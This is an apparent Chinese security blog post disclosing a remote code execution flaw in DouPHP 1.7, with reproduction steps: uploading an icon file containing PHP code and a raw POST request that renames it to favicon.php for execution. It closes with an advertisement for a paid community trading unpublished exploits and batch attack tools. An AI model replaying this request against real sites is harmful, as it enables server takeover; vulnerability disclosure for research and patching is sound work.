#  【0day】DouPHP 1.7 Release 20220822 远程代码执行漏洞   
 安全之眼SecEye   2024-08-19 17:11  
  
点击上方「蓝字」，关注我们  
  
因为公众号现在只对常读和星标的公众号才能展示大图推送，建议大家进行星标  
。操作方法：点击右上角的【...】，然后点击【设为星标】即可。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/FUKJN1fH76k4fD8m0rkPrAict2lkdiaUHasZshA7Yibv0OpnNzpPKLRbGBC8ib7Fngn81sYBPpOaObsyU2iceZ4XPicQ/640?wx_fmt=png&from=appmsg "")  
  
  
01  
  
# 免责声明  
  
  
**免责声明：**  
文章所涉及内容，仅供安全研究与教学之用，由于传播、利用本文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者及本公众号不为此承担任何责任。  
  
02  
  
# 文章正文  
  
  
# 漏洞描述  
> DouPHP是一个开源的PHP开发框架，广泛应用于快速开发Web应用。其设计目标是简单、快速、灵活、安全。  
  
  
DouPHP 1.7Release20220822版本中存在一个远程代码执行（RCE）漏洞。拥有管理员权限的攻击者可以通过该漏洞在服务器上执行任意命令。漏洞通过上传恶意文件、修改文件扩展名以及通过构造特定的数据包来执行PHP代码。  
# 漏洞复现  
  
1、 登录管理员后台。  
  
2、 上传恶意文件  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/FUKJN1fH76mSP53bAh3KOBvX6tibKL9X7eU608QSbc14O9adBibr0JP8ia5aUwxd0uGxnqbVFfkLnDd3WLJ13wzPA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/FUKJN1fH76mSP53bAh3KOBvX6tibKL9X7145RxCFaZc7KEVSsRFIjaMELSVCT8o2XuMibRJc523jzIIE3ovtuQ7w/640?wx_fmt=png&from=appmsg "")  
  
3、 上传一个包含php代码的ico图标  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/FUKJN1fH76mSP53bAh3KOBvX6tibKL9X757mSia8oMbx1Mp4wKGdL5Xylzfxgnzbtz7yPoVf4Rvf3rV1Frej7mRg/640?wx_fmt=png&from=appmsg "")  
  
上传成功:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/FUKJN1fH76mSP53bAh3KOBvX6tibKL9X7BMUmCHVBsxibzBsIGAsPZ3NGDAHty8aNPomngybM9z1M5LaCgRBOs5w/640?wx_fmt=png&from=appmsg "")  
  
4、把上传的favicon.ico文件修改为favicon.php,从而执行php代码。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/FUKJN1fH76mSP53bAh3KOBvX6tibKL9X7yQBr5iaMvScQB6R1oh6bWKrg17DtQXbaVaFuZ5SBWS64UEoL4CpPlbw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/FUKJN1fH76mSP53bAh3KOBvX6tibKL9X7gO1CTka7uYwZzd5wGW9MEjY3OGg4ECEW0YRu3bQ5eiaib9ItXk1M6SbA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/FUKJN1fH76mSP53bAh3KOBvX6tibKL9X756WicCibeS8nyM7rrm9lZicX6fVLibWxsicIBejibfYqkGmAaWlnq0A7NWCw/640?wx_fmt=png&from=appmsg "")  
  
抓取数据包，进行修改文件名操作  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/FUKJN1fH76mSP53bAh3KOBvX6tibKL9X7gHj2SexMd8tEPDqibvQDDFCnKY1dNhQHseTGUUl6b7s9oNNJw84xftA/640?wx_fmt=png&from=appmsg "")  
```
POST /cache/custom\_admin\_path.candel.php HTTP/1.1
Host: douphp:84
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,\*/\*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 109
Origin: http://douphp:84
Connection: close
Referer: http://douphp:84/admin/tool.php?rec=custom\_admin\_path
Cookie: PHPSESSID=bl1s095coldq9mc4a2d9ivrgki
Upgrade-Insecure-Requests: 1
Priority: u=0, i

new\_path=favicon.php&old\_path=favicon.ico&ryjwoi=278144&root\_url=http%3A%2F%2Fdouphp%3A84%2F&submit=%E6%8F%90%E4%BA%A4
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/FUKJN1fH76mSP53bAh3KOBvX6tibKL9X7ulpblFrV4pxhU2x2ibx6kLMQdRY3gghHwianmQUlH1icpl04tQqiadvHFw/640?wx_fmt=png&from=appmsg "")  
  
访问对应的恶意文件路径:http://{你的url地址}/favicon.php  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/FUKJN1fH76mSP53bAh3KOBvX6tibKL9X75PZRRKNCD5Uz7MlTPVb8neP4TQewMEpU7kKPEXBrB1WZMYFHpaicZhA/640?wx_fmt=png&from=appmsg "")  
  
attachment/2024/08/d773107c-726b-4f24-a0b7-4aff6cf98e48-weAxeCnx.docx  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
  
**星球介绍**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
  
高质量漏洞利用工具、漏洞POC/EXP、实战tips分享社区，日常更新0Day/Nday/1day及对应漏洞的批量利用工具，内部POC分享，星球不定时更新内外网攻防渗透技巧、src挖掘技巧等。  
同时，内部的交流群有很多行业老师傅可以为你解答学习上的疑惑  
，实战或者攻防中遇到的技术、非技术难题我们也可以通过自己的途径帮你一起解决。  
  
**【星球服务】**  
  
1，Fofa永久高级会员  
  
2，常态化更新最新的漏洞POC/EXP，未公开、半公开漏洞POC  
  
3，不定时更新SRC挖掘小技巧、SRC挖掘报告  
  
4，安全圈兼职、全职工作内推途径；职业生涯发展路线答疑解惑  
  
5，各种漏洞利用工具，渗透工具、学习资料文档分享  
  
6，加入内部微信群，认识更多的行业朋友（各大安全厂商以及互联网、金融行业甲方安全师傅），遇到任何技术问题都可以进行快速提问、讨论交流；  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/FUKJN1fH76nCng18dyM5JHBugAZhk667q3pyYQYNtOtIXwPd8zuDeTBrTkWRgBiaQibCibH6UTtLYNzr0C80yIHQg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/FUKJN1fH76mSP53bAh3KOBvX6tibKL9X78E7Uvic93LzziajvaHX6Vcm7HygBepxpQPefUYBJpmCPWnLnqAIwTl1g/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/FUKJN1fH76mSP53bAh3KOBvX6tibKL9X7oyC9n7e6sZgYBdeAaD6q44R4nTia9WEGTDcshY5OWy8WCSEZTlkuo2Q/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/FUKJN1fH76mSP53bAh3KOBvX6tibKL9X77hWOuBIwoZ7lrajLWQ6eiaYTxSC3AVjbbutcfcibmyuJcR9Qcrm5xblA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/FUKJN1fH76mSP53bAh3KOBvX6tibKL9X7SCzSsicQQlIfS5r2UgFJxqYT9cH4D9INNglzwOZTW4CkaEG8uEnAH3Q/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/FUKJN1fH76mSP53bAh3KOBvX6tibKL9X7mc06OG32Y2tR1q3sBlr36xcLy7yvWbP6nErVMuzw0SfZOY2VDxXFoQ/640?wx_fmt=png&from=appmsg "")  
  
  
点个「在看」，你最好看  
  
